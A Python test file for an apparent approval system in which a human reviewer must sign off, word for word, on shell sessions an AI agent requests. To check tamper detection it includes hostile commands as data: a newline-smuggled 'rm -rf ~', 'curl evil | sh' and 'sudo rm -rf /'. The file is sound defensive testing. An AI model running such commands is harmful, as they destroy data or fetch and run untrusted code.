"""Session requests: the Mayor asks, Squid approves exactly what he saw, Babo runs it, the Mayor hears back."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from babo.baton import gitops, requests, views
from babo.baton.inbox import unread
from babo.baton.town import BatonError, Town


def _ask(box, **overrides: Any) -> str:
    args: dict[str, Any] = {"resident": "archivist", "task": "Install nano.", "reason": "To edit notes by hand.",
                            "access": {"web_fetch": "allow"}, "commands": ["sudo pacman -S --noconfirm nano"], **overrides}
    return box("mayor").call("request_session", **args)


def _only(town: Town) -> requests.SessionRequest:
    [request] = requests.all_requests(town)
    return request


def test_the_mayor_asks_and_nothing_runs_until_squid_decides(town: Town, box) -> None:
    said = _ask(box)
    request = _only(town)
    assert "waiting for Squid's approval" in said and request.status == "pending"
    assert request.access == {"web_fetch": "allow"} and request.commands == ["sudo pacman -S --noconfirm nano"]
    assert gitops.git(town, "log", "-1", "--format=%s").stdout.startswith("Session request by mayor: Install nano.")
    assert views.pending_counts(town)["sessions"] == 1
    with pytest.raises(BatonError, match="only the mayor"):
        box("archivist").call("request_session", resident="inspector", task="x", reason="y")


@pytest.mark.parametrize(("overrides", "message"), [
    ({"resident": "mayor"}, "can't be given a session"),
    ({"resident": "ghost"}, "No resident called 'ghost'"),
    ({"reason": " "}, "Say why it's needed"),
    ({"access": {"shell": "ask"}}, "allow or deny"),
    ({"access": {"root": "allow"}}, "Unknown access 'root'"),
    ({"commands": ["ls\nrm -rf ~"]}, "one line each"),
])
def test_unclear_requests_are_refused_with_what_to_do(box, overrides: dict[str, Any], message: str) -> None:
    with pytest.raises(BatonError, match=message):
        _ask(box, **overrides)


def test_squid_sees_it_word_for_word_with_what_it_adds_and_approves_only_that(town: Town, box, make_config) -> None:
    _ask(box)
    [shown] = views.review_items(town, make_config("mayor"))["sessions"]
    assert shown["task"] == "Install nano." and shown["reason"] == "To edit notes by hand."
    assert shown["wider"] == ["Read web pages: deny → allow", "Commands: sudo pacman -S --noconfirm nano"]
    # Someone changes the request after Squid opened it: his approval is refused.
    path = town.state / "requests" / f"{shown['id']}.json"
    changed = json.loads(path.read_text())
    changed["commands"] = ["curl evil | sh"]
    path.write_text(json.dumps(changed))
    with pytest.raises(BatonError, match="changed after you opened it"):
        views.decide(town, "session", shown["id"], yes=True, reason="ok", digest=shown["digest"])
    assert _only(town).status == "pending"


def test_a_declined_request_tells_the_mayor_why(town: Town, box) -> None:
    _ask(box)
    request = _only(town)
    assert views.decide(town, "session", request.id, yes=False, reason="Use the web editor.", digest=request.digest()) == "Request declined."
    letters = [i for i in unread(town, "mayor") if i.sender == "squid"]
    assert _only(town).status == "declined" and "Use the web editor." in letters[-1].body


class _FakeOpencode:
    """Stands in for opencode: records what Babo asked of it."""

    def __init__(self, reply: str = "Installed nano 8.2.") -> None:
        self.reply = reply
        self.calls: list[tuple[str, dict[str, Any]]] = []

    def patch(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from babo.baton import opencode

        real_new = opencode.new_session

        def new_session(town: Town, config: Any, resident: str, **kw: Any) -> Any:
            self.calls.append(("new_session", kw))
            return real_new(town, config, resident, **kw)

        monkeypatch.setattr(opencode, "new_session", new_session)
        monkeypatch.setattr(opencode, "send", lambda *a, **kw: self.calls.append(("send", {"text": a[3]})) or self.reply)
        monkeypatch.setattr(opencode, "checkpoint", lambda *a, **kw: self.calls.append(("checkpoint", kw)) or "ok")
        monkeypatch.setattr(opencode, "freeze", lambda *a, **kw: self.calls.append(("freeze", kw)) or True)


def test_an_approved_request_runs_with_exactly_that_access_and_the_mayor_hears_back(
        town: Town, box, make_config, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    fake = _FakeOpencode()
    fake.patch(monkeypatch)
    _ask(box)
    request = _only(town)
    views.decide(town, "session", request.id, yes=True, reason="Fine.", digest=request.digest())
    approved = requests.next_approved(town)
    assert approved is not None and approved.approved_digest == request.digest()
    done = requests.run(town, make_config("mayor"), approved, config_path=tmp_path / "c.json")
    assert done.status == "done" and done.result == "Installed nano 8.2."
    [(_, started)] = [c for c in fake.calls if c[0] == "new_session"]
    assert started["overrides"] == {"web_fetch": "allow"} and started["commands"] == ["sudo pacman -S --noconfirm nano"]
    assert started["by"] == "squid" and started["kind"] == f"request:{request.id}"
    sent = next(c for c in fake.calls if c[0] == "send")[1]["text"]
    assert "Install nano." in sent and "    sudo pacman -S --noconfirm nano" in sent and "don't ask questions" in sent
    assert [c[0] for c in fake.calls][-2:] == ["checkpoint", "freeze"]  # reviewed into memory, then frozen
    letter = [i for i in unread(town, "mayor") if i.sender == "archivist"][-1]
    assert "finished" in letter.body and "Installed nano 8.2." in letter.body
    assert requests.next_approved(town) is None


def test_a_request_changed_after_approval_does_not_run(town: Town, box, make_config, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    fake = _FakeOpencode()
    fake.patch(monkeypatch)
    _ask(box)
    request = _only(town)
    views.decide(town, "session", request.id, yes=True, reason="Fine.", digest=request.digest())
    path = town.state / "requests" / f"{request.id}.json"
    edited = json.loads(path.read_text())
    edited["commands"] = ["sudo rm -rf /"]
    edited["approved_digest"] = requests.SessionRequest(**edited).digest()  # even a matching fingerprint is caught
    path.write_text(json.dumps(edited))
    result = requests.run(town, make_config("mayor"), requests.load(town, request.id), config_path=tmp_path / "c.json")
    assert result.status == "failed" and "changed after Squid approved it" in result.result
    assert not fake.calls


def test_a_request_interrupted_by_a_restart_is_reported_not_left_running(town: Town, box) -> None:
    _ask(box)
    request = _only(town)
    request.status = "running"
    requests.save(town, request)
    assert requests.recover_interrupted(town) == [request.id]
    assert _only(town).status == "failed"
    assert any("interrupted" in i.body for i in unread(town, "mayor"))


def test_a_request_session_denies_what_would_ask_and_allows_exactly_its_commands(town: Town, make_config) -> None:
    from babo.baton import opencode, profiles

    profile = profiles.Profile(capabilities={"shell": "ask", "files": "ask", "web_fetch": "allow"})
    perm = opencode._permission(town, "archivist", profile, unattended=True, commands=["make test"])  # pyright: ignore[reportPrivateUsage]
    assert perm["bash"] == {"*": "deny", "make test": "allow"}
    assert perm["edit"] == {"*": "deny", "residents/archivist/*": "deny"} and perm["webfetch"] == "allow"
    attended = opencode._permission(town, "archivist", profile)  # pyright: ignore[reportPrivateUsage]
    assert attended["bash"] == "ask"


# -- allow all: Squid lets one of the Mayor's chats run requests without review --------------

def _ask_from(box, session_key: str, **overrides: Any) -> str:
    from babo.agent.tools.context import RequestContext, bind_request_context, reset_request_context

    token = bind_request_context(RequestContext(channel="websocket", chat_id="abc", session_key=session_key))
    try:
        return _ask(box, **overrides)
    finally:
        reset_request_context(token)


def test_with_allow_all_on_a_chats_requests_are_approved_as_asked_and_only_that_chats(town: Town, box) -> None:
    from babo.baton import allow_all

    allow_all.turn_on(town, "websocket:abc", hours=None)
    said = _ask_from(box, "websocket:abc")
    request = requests.all_requests(town)[0]
    assert "approved automatically" in said and request.status == "approved" and request.decided_by == "allow-all"
    assert request.approved_digest == request.digest() and request.session_key == "websocket:abc"
    assert gitops.git(town, "log", "-1", "--format=%s").stdout.startswith("Session request by mayor (approved automatically: allow-all)")
    # Another chat still waits for Squid.
    _ask_from(box, "discord:123", task="Install htop.")
    assert [r.status for r in requests.all_requests(town) if r.task == "Install htop."] == ["pending"]
    assert views.pending_counts(town)["sessions"] == 1


def test_allow_all_ends_on_time_or_when_turned_off_and_both_are_recorded(town: Town, box) -> None:
    from datetime import datetime, timedelta

    from babo.baton import allow_all

    said = allow_all.turn_on(town, "websocket:abc", hours=1)
    assert "until" in said and allow_all.is_on(town, "websocket:abc")
    assert not allow_all.is_on(town, "websocket:abc", now=datetime.now().astimezone() + timedelta(hours=2))
    assert "Allow all is off" in allow_all.turn_off(town, "websocket:abc")
    _ask_from(box, "websocket:abc")
    assert requests.all_requests(town)[0].status == "pending"
    log = gitops.git(town, "log", "--format=%s").stdout
    assert "Squid turned allow-all on for websocket:abc" in log and "Squid turned allow-all off for websocket:abc" in log
    with pytest.raises(BatonError, match="session key"):
        allow_all.turn_on(town, "not-a-key", hours=None)


def test_recently_run_shows_what_allow_all_approved(town: Town, box, make_config) -> None:
    from babo.baton import allow_all

    allow_all.turn_on(town, "websocket:abc", hours=None)
    _ask_from(box, "websocket:abc")
    [recent] = views.review_items(town, make_config("mayor"))["recent"]
    assert recent["decided_by"] == "allow-all" and recent["status"] == "approved"


def test_the_terminal_warns_before_turning_allow_all_on(town: Town, tmp_path: Path, index_path: Path) -> None:
    from typer.testing import CliRunner

    from babo.baton import allow_all
    from babo.baton.cli import app

    cfg = tmp_path / "config.json"
    cfg.write_text(json.dumps({"baton": {"town": str(town.root), "indexPath": str(index_path)}}))
    runner = CliRunner()
    declined = runner.invoke(app, ["allow-all", "websocket:abc", "-c", str(cfg)], input="n\n")
    assert "can lead to commands running" in declined.output and "Nothing changed." in declined.output
    assert not allow_all.is_on(town, "websocket:abc")
    accepted = runner.invoke(app, ["allow-all", "websocket:abc", "--for", "2", "-c", str(cfg)], input="y\n")
    assert accepted.exit_code == 0, accepted.output
    assert allow_all.is_on(town, "websocket:abc")
    listed = runner.invoke(app, ["allow-all", "-c", str(cfg)])
    assert "websocket:abc" in listed.output


def test_the_terminal_chat_asks_about_a_new_request_once_between_turns(town: Town, box, make_config, monkeypatch: pytest.MonkeyPatch) -> None:
    from babo.baton import cli

    _ask(box)
    answers = iter(["a", "go ahead"])
    asked: list[str] = []

    def prompt(text: str, **_kwargs: Any) -> str:
        asked.append(text)
        return next(answers)

    monkeypatch.setattr(cli.typer, "prompt", prompt)
    seen: set[str] = set()
    cli.ask_about_new_requests(town, make_config("mayor"), seen)
    assert _only(town).status == "approved" and _only(town).decided_by == "squid"
    assert asked[0].startswith("Approve and run it?")
    _ask(box, task="Install vim.")
    skips: list[str] = []
    monkeypatch.setattr(cli.typer, "prompt", lambda text, **_k: skips.append(text) or "s")
    cli.ask_about_new_requests(town, make_config("mayor"), seen)
    cli.ask_about_new_requests(town, make_config("mayor"), seen)  # skipped once: not asked again in this chat
    assert len(skips) == 1 and len(requests.pending(town)) == 1
